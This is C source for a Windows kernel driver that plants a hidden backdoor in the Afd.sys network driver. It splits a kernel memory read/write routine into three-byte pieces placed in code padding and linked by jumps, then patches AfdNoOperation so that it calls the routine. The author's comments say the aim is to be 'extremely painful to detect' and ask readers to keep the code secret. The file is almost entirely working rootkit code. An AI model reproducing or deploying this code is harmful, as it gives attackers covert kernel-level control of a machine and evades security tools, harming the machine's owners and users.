#include <ntddk.h>
#include <ntdef.h>
#include <intrin.h>

#include "Defs.h"
#include "Leak.h"

// The 0x41's should be overwritten with a pointer to the start of the backdoor.
UCHAR g_pInvokeEntryPoint[12] =
{
	0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0xFF, 0xD0
};

UCHAR g_pBackdoor[20 * 3] =
{
	0x56, 0x90, 0x90,
	0x57, 0x90, 0x90,
	0x51, 0x90, 0x90,
	0x48, 0xAD, 0x90,
	0x48, 0xAD, 0x90,
	0x48, 0xAD, 0x90,
	0x48, 0xAD, 0x90,
	0x48, 0xAD, 0x90,
	0x48, 0x89, 0xC6,
	0x48, 0xAD, 0x90,
	0x48, 0x89, 0xC7,
	0x48, 0xAD, 0x90,
	0x48, 0x89, 0xC1,
	0x48, 0xAD, 0x90,
	0xF3, 0xAA, 0x90,
	0x59, 0x90, 0x90,
	0x5F, 0x90, 0x90,
	0x5E, 0x90, 0x90,
	0x31, 0xC0, 0x90,
	0xC3, 0xCC, 0xCC,
};

UCHAR g_pAFDDispatchTableSignature[3] =
{
	0xF8, 0xFF, 0xFF
};

NTSTATUS ReadWriteMemory(PVOID pTargetAddress, PVOID pData, ULONG ByteCount, UCHAR IsWrite)
{
	NTSTATUS Status = STATUS_SUCCESS;

	PMDL pMDL = 0;
	PVOID pRWAddress = 0;

	pMDL = IoAllocateMdl(pTargetAddress, ByteCount, 0, 0, 0);
	if (!pMDL)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	__try
	{
		MmProbeAndLockPages(pMDL, KernelMode, IsWrite);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_ACCESS_VIOLATION;
	}

	pRWAddress = MmMapLockedPagesSpecifyCache(pMDL, KernelMode, MmNonCached, 0, 0, NormalPagePriority);
	if (!pRWAddress)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	Status = MmProtectMdlSystemAddress(pMDL, PAGE_READWRITE);
	if (!NT_SUCCESS(Status))
	{
		return Status;
	}

	if (IsWrite)
	{
		memcpy(pRWAddress, pData, ByteCount);
	}
	else
	{
		memcpy(pData, pRWAddress, ByteCount);
	}

	MmUnmapLockedPages(pRWAddress, pMDL);
	MmUnlockPages(pMDL);
	IoFreeMdl(pMDL);

	return Status;
}

NTSTATUS ScanForPaddingBytes(ULONG_PTR BaseAddress, ULONG ScanAddress, ULONG SizeOfCodeSegment, PULONG_PTR pFoundAddress)
{
	ULONG_PTR FoundAddress = 0;

	for (ULONG i = ScanAddress; i < SizeOfCodeSegment; i++)
	{
		if (*(PULONG_PTR)(BaseAddress + i) == OVERWRITE_BYTES_SIGNATURE)
		{
			FoundAddress = BaseAddress + i;
			break;
		}
	}

	*pFoundAddress = FoundAddress;

	return FoundAddress ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

// Iterate over the entire Afd.sys driver in memory after leaking its base address and fragment an entire R/W function across it.
// This should make it extremely painful to detect unless the method is burnt publicly.
// So, if you received this code from me, don't share it with everyone! Keep it safe.
// Well, unless nobody cared about the project, in that case I would've published it publicly.
NTSTATUS InstallBackdoor(void)
{
	NTSTATUS Status = STATUS_SUCCESS;

	ULONG_PTR AFDBase = 0;
	ULONG AFDSize = 0;

	ULONG_PTR OptionalHeader = 0;
	ULONG AFDBaseOfCode = 0;
	ULONG AFDSizeOfCode = 0;

	ULONG_PTR AFDNoOperationPointer = 0;
	ULONG_PTR AFDNoOperation = 0;

	ULONG JumpOpcode = 0xE9;
	ULONG JumpOffset = 0;
	ULONG_PTR FirstLocation = 0;
	ULONG_PTR PreviousLocation = 0;

	ULONG AFDOffsetForLoop = 0;
	ULONG FoundCount = 0;
	ULONG_PTR FoundLocation = 0;

	// I am forced to hard-code it...
	Status = LeakDriverInfo((const char*)"\\SystemRoot\\system32\\drivers\\afd.sys", (PVOID)&AFDBase, &AFDSize);
	if (!NT_SUCCESS(Status))
	{
		return Status;
	}

	for (ULONG i = 0; i < AFDSize; i++)
	{
		if (*(PULONG_PTR)(AFDBase + i) == AFD_OPTIONALHEADER_SIGNATURE)
		{
			FoundLocation = AFDBase + i;
			break;
		}
	}
	if (!FoundLocation)
	{
		return STATUS_UNSUCCESSFUL;
	}
	OptionalHeader = FoundLocation + 6;
	AFDBaseOfCode = *(PULONG)(OptionalHeader + 0x14);
	AFDSizeOfCode = *(PULONG)(OptionalHeader + 4);

	while (AFDOffsetForLoop < AFDSize)
	{
		if (!memcmp((PULONG_PTR)(AFDBase + AFDOffsetForLoop), g_pAFDDispatchTableSignature, 3))
		{
			FoundCount++;
			AFDOffsetForLoop += 8;
		}
		else
		{
			FoundCount = 0;
			AFDOffsetForLoop++;
		}

		if (FoundCount >= 46)
		{
			FoundLocation = AFDBase + AFDOffsetForLoop;
			break;
		}
	}
	if (!FoundLocation)
	{
		return STATUS_UNSUCCESSFUL;
	}
	AFDNoOperationPointer = FoundLocation - 5 - 0x38;
	AFDNoOperation = *(PULONG_PTR)(AFDNoOperationPointer);

	for (ULONG i = 0; i < sizeof(g_pBackdoor) / 3; i++)
	{
		Status = ScanForPaddingBytes
		(
			AFDBase,
			AFDBaseOfCode + (PreviousLocation ? (ULONG)(PreviousLocation - AFDBase) : 0) + 0x1000,
			AFDSizeOfCode,
			&FoundLocation
		);
		if (!NT_SUCCESS(Status))
		{
			return Status;
		}

		if (!FirstLocation)
		{
			FirstLocation = FoundLocation;
		}

		Status = ReadWriteMemory((PVOID)FoundLocation, (PVOID)((PUCHAR)(g_pBackdoor + (i * 3))), 3, 1);
		if (!NT_SUCCESS(Status))
		{
			return Status;
		}

		if (PreviousLocation && i < (sizeof(g_pBackdoor) / 3) - 1)
		{
			// This calculates the offset that the jmp instruction should perform.
			// The formula for calculating it is dst - end_of_jmp.
			JumpOffset = (ULONG)(FoundLocation - (PreviousLocation + 3 + 5));

			Status = ReadWriteMemory((PVOID)((PUCHAR)(PreviousLocation + 3)), (PVOID)&JumpOpcode, 1, 1);
			if (!NT_SUCCESS(Status))
			{
				return Status;
			}

			Status = ReadWriteMemory((PVOID)((PUCHAR)(PreviousLocation + 4)), (PVOID)&JumpOffset, 4, 1);
			if (!NT_SUCCESS(Status))
			{
				return Status;
			}
		}

		PreviousLocation = FoundLocation;
	}
	// Just a quick sanity check, despite that it should be physically impossible for FirstLocation to be zero here.
	if (!FirstLocation)
	{
		return STATUS_UNSUCCESSFUL;
	}

	// TODO: All that's left is to hook afd!AfdNoOperation at the correct offset (0x1A) and WE'RE FUCKING DONE!!!!!!!!!!!!!!!!!!!!
	// Offset to write into afd!AfdNoOperation: 0x1A (afd!AfdNoOperation+0x1A)
	// ...
	// Also, friendly reminder to use FirstLocation
	*(PULONG_PTR)((PUCHAR)(g_pInvokeEntryPoint + 2)) = FirstLocation;

	// And FINALLY, after all the time I spent writing this damn driver...
	// ... overwrite the mov r10, ... and call instruction with our entry-point.
	// We. Are. DONE!!!!!!!!!!!!!
	return ReadWriteMemory((PVOID)((PUCHAR)(AFDNoOperation + 0x1A)), g_pInvokeEntryPoint, sizeof(g_pInvokeEntryPoint), 1);
}